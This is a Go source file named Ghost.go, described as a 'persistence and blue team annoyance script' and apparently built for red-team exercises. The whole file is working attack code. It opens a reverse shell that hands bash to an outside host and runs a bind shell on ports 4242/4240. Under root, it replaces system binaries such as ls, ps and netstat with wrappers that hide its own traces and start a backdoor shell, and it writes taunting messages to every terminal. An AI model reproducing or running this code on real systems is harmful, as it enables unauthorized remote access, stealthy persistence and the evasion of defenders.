//
// Ghost.go
//
// lukem1
// 30 March 2021
//

//
// Do-it-all persistence and blue team annoyance script.
//

package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	/*"sync"*/
	/*"syscall"*/
	"time"
)


// Write a message to all pts sessions
func ghostsay(msg string) {
	dir := "/dev/pts"
	pts, e := os.ReadDir(dir)
	if e != nil {
		log.Printf(e.Error())
	}
	
	for _, s := range pts {
		f := fmt.Sprintf("%s/%s", dir, s.Name())
		if s.Name() != "ptmx" {
			os.WriteFile(f, []byte(msg), 0666)
		}
	}
}


// dial connects to the specified host:port and creates a reverse shell
func dial(host string, port int) {
	log.Printf("Calling %s:%d...\n", host, port)
	
	c, e := net.Dial("tcp",fmt.Sprintf("%s:%d", host, port))
	if e != nil {
		log.Printf("Failed to connect.\n")
		return
	}
	log.Printf("Connected to %s:%d.\n", host, port)
	banner := "Ghost is Listening...\n"
	c.Write([]byte(banner))
	
	shell := exec.Command("/bin/bash")
	shell.Stdin=c;shell.Stdout=c;shell.Stderr=c;
	shell.Run()
}


// bind listens on the specified tcp port and provides a shell
func bind(port int) {
	// Start listening on the specified tcp port
	l, e := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if e != nil {
		log.Fatal(e)
	}
	
	log.Printf("Listening on port %d...\n", port) 
	
	// Close the listener when bind returns
	defer l.Close()
	
	// session func to handle connections
	session := func (c net.Conn) {
		log.Printf("Recieved connection from %s!\n", c.RemoteAddr())
		banner := "Ghost is Listening...\n"
		c.Write([]byte(banner))
		
		// Execute bash and pass to the connection
		shell := exec.Command("/bin/bash")
		shell.Stdin = c; shell.Stdout = c; shell.Stderr = c;
		shell.Run()
		
		c.Close()
		log.Printf("Connection from %s closed.\n", c.RemoteAddr())
	}
	
	// Accept any incoming connections
	for {
		c, e := l.Accept()
		if e != nil {
			log.Print(e)
		}
		// Start a goroutine to handle any connections
		go session(c)
		ghostsay("\nThat's interesting...\n")
	}
}


// Copy file src to dst and assign the permissions mode
func copyfile(src string, dst string, mode os.FileMode) {
	source, e := os.Open(src)
	if e != nil {
		log.Fatal("Error reading file.")
	}
	defer source.Close()
	
	dest, e := os.Create(dst)
	if e != nil {
		log.Fatal("Error creating file.")
	}
	defer dest.Close()
	io.Copy(dest, source)
	
	// Place chmod on defer stack so it executes after dest.Close()
	defer os.Chmod(dst, mode)
}


// Possess some executables
func possess() {
	if os.Getuid() != 0 {
		log.Fatal("possess requires root.")
	}
	ghostpath := "/bin/.gnughost"
	//targets := []string{"/bin/ps", "/bin/netstat"}
	targets := []string{"/bin/ls","/bin/cp","/bin/apt","/bin/who", "/bin/netstat", "/bin/ps"}
	
	// Copy Ghost to ghostpath if not there already
	if _, e := os.Stat(ghostpath); os.IsNotExist(e) {
		exe, _ := os.Executable()
		copyfile(exe, ghostpath, 0755)
	}
	
	// Copy targets to hidden files
	for _, t := range targets {
		if _, e := os.Stat(t); !os.IsNotExist(e) {
			s := strings.Split(t, "/")
			tcopy := fmt.Sprintf("/bin/.ghost%s", s[len(s)-1])
			if _, e := os.Stat(tcopy); os.IsNotExist(e) {
				copyfile(t, tcopy, 0755)
			}
		}
	}
	
	// Overwrite targets with mimic script
	
	mimic := fmt.Sprintf("#!/bin/bash\n%s --nolog --pretend $0 $@", ghostpath)
	
	for _, target := range targets {
		os.Remove(target)
		clone, e := os.Create(target)
		if e != nil {
			log.Fatal(e.Error())
		}
		defer clone.Close()
		clone.WriteString(mimic)
		defer os.Chmod(target, 0755)
	}
	
}


// Pretend to be another executable, filtering out revealing info
func pretend(exe string, args []string) {
	s := strings.Split(exe, "/")
	exename := s[len(s)-1]
	ghostexe := fmt.Sprintf("/bin/.ghost%s", exename)
	log.Printf("pretend: Executing %s %v\n", ghostexe, args)
	raw, e := exec.Command(ghostexe, args...).CombinedOutput()
	if e != nil {
		log.Print(e)
	}
	out := strings.Split(string(raw), "\n")
	
	// Patterns to filter out
	patterns := []string{"ghost", string(os.Getpid()), "4240", "4242", "2424"}
	for _, line := range out {
		safe := true
		for _, p := range patterns {
			if strings.Contains(strings.ToLower(line), p) {
				safe = false
				break
			}
		}
		if safe {
			fmt.Println(line)
		}
	}
}


func main() {
	// Process command line arguments sequentially
	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
			case "--bind": // --bind
			/*
			Create a bind shell. Uses port 4242 if root and 4240 otherwise.
			*/
			port := 4242
			if os.Getuid() != 0 {
				port = 4240
			}
			bind(port)
			case "--dial": // --dial <host> <port>
			/*
			Attempts to connect to host:port and create a reverse shell.
			*/
			port, _ := strconv.Atoi(os.Args[i+2])
			dial(os.Args[i+1], port)
			i += 2
			case "--jump": // --jump <index>
			/*
			Jump to i = index. This allows for simple looping, for example:
			Command : ./Ghost --say loop --sleep 1 --jump 1
			Index   : 0       1     2    3       4 5      6
			*/
			i, _ = strconv.Atoi(os.Args[i+1]) 
			i -= 1 // negate next i++
			case "--nolog": // --nolog
			/*
			Disable logging to stdout.
			*/
			log.SetOutput(ioutil.Discard)
			case "--possess": // --possess
			/*
			Possess target binaries and replace them with a script to call --pretend.
			*/
			possess()
			case "--pretend": // --pretend <command> <args...>
			/*
			Pretend to be a executable that has been possessed, and start a bind shell.
			In most cases should only be called by possess scripts.
			*/
			pretend(os.Args[i+1], os.Args[i+2:])
			cmd := exec.Command(os.Args[0], []string{"--bind"}...)
			cmd.Start()
			return
			case "--say": // --say <message>
			/*
			Write a message to all pts sessions.
			*/
			ghostsay(os.Args[i+1])
			i += 1
			case "--sleep": // --sleep <seconds>
			/*
			Sleep for the specified amount of seconds.
			*/
			sec, _ := strconv.Atoi(os.Args[i+1])
			time.Sleep(time.Duration(sec) * time.Second)
			i += 1
			default:
			log.Fatal("Unrecognized argument: ", os.Args[i])
		}
	}
}
